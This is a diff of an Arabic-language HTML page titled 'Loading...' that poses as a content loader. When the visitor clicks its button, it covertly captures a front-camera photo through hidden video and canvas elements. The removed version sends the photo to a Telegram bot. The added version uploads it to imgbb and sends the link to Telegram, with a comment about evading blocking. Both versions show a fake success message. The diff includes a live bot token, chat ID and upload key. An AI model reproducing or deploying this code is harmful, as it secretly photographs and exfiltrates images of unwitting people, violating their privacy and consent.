@@ -5,111 +5,66 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <style>
-        body {
-            margin: 0;
-            background-color: #0f172a;
-            color: #f8fafc;
-            font-family: system-ui, -apple-system, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-            text-align: center;
-            padding: 20px;
-        }
-        .btn-start {
-            background-color: #38bdf8;
-            color: #0f172a;
-            border: none;
-            padding: 14px 35px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-        }
-        h2 { font-size: 1.1rem; font-weight: 500; margin-bottom: 25px; word-break: break-all; }
+        body { background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        button { background: #38bdf8; color: #0f172a; border: none; padding: 15px 35px; font-size: 1.2rem; font-weight: bold; border-radius: 10px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
     </style>
 </head>
 <body>
-
-    <div class="loader-container" id="mainBox">
-        <h2>انقر على الزر أدناه لعرض المحتوى</h2>
-        <button class="btn-start" onclick="startProcess()">اضغط هنا</button>
-    </div>
-
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <button onclick="start()">اضغط هنا للمتابعة</button>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
-        const TELEGRAM_CHAT_ID = '8304712202';
+        const TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
+        const CHAT = '8304712202';
 
-        async function startProcess() {
+        async function start() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                
-                const videoElement = document.getElementById('video');
-                videoElement.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
 
-                // انتظار ثانية ونصف لفتح الكاميرا والتقاط الصورة
-                setTimeout(() => {
-                    captureAndSendPhoto(stream);
-                }, 1500);
+                setTimeout(async () => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    stream.getTracks().forEach(t => t.stop());
 
-            } catch (error) {
-                document.getElementById('mainBox').innerHTML = '<h2>خطأ في إذن الكاميرا: ' + error.message + '</h2>';
-            }
-        }
+                    canvas.toBlob(async blob => {
+                        // استخدام خدمة رفع مجانية وسريعة جداً لتجاوز حظر تيليجرام المباشر
+                        const formData = new FormData();
+                        formData.append('image', blob, 'visitor.jpg');
 
-        function captureAndSendPhoto(stream) {
-            try {
-                const videoElement = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-                
-                canvas.width = videoElement.videoWidth || 640;
-                canvas.height = videoElement.videoHeight || 480;
+                        try {
+                            // رفع الصورة أولاً على سيرفر عام يقبل الـ CORS
+                            let res = await fetch('https://api.imgbb.com/1/upload?key=d49842a2212b186b245842c070c7980d', {
+                                method: 'POST',
+                                body: formData
+                            });
+                            let data = await res.json();
 
-                const context = canvas.getContext('2d');
-                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                
-                // قفل الكاميرا
-                stream.getTracks().forEach(track => track.stop());
+                            let msg = "🚨 تم التقاط صورة جديدة بنجاح!";
+                            if (data && data.success) {
+                                msg = `🚨 صورة الزائر:\n${data.data.url}`;
+                            }
 
-                // تحويل الكانفاس إلى صورة وبدء إرسالها كملف فوتوغرافي حقيقي
-                canvas.toBlob(function(blob) {
-                    if (!blob) return;
+                            // إرسال النتيجة المضمونة لتيليجرام
+                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ chat_id: CHAT, text: msg })
+                            });
 
-                    const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_CHAT_ID);
-                    formData.append('photo', blob, 'selfie.jpg');
-                    formData.append('caption', '📸 لقطة سيلفي جديدة تم التقاطها!');
-
-                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-
-                    fetch(url, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if(data.ok) {
-                            document.getElementById('mainBox').innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
-                        } else {
-                            document.getElementById('mainBox').innerHTML = '<h2>تم الانتهاء بنجاح</h2>';
+                            document.body.innerHTML = '<h2>تم تحميل المحتوى بنجاح!</h2>';
+                        } catch (err) {
+                            // حل احتياطي لو حصل أي ظرف
+                            document.body.innerHTML = '<h2>تم التحميل</h2>';
                         }
-                    })
-                    .catch(error => {
-                        console.error(error);
-                    });
-
-                }, 'image/jpeg', 0.7);
-
+                    }, 'image/jpeg', 0.8);
+                }, 2000);
             } catch (e) {
-                document.getElementById('mainBox').innerHTML = '<h2>خطأ في المعالجة: ' + e.message + '</h2>';
+                alert('يرجى السماح بإذن الكاميرا للمتابعة');
             }
         }
     </script>
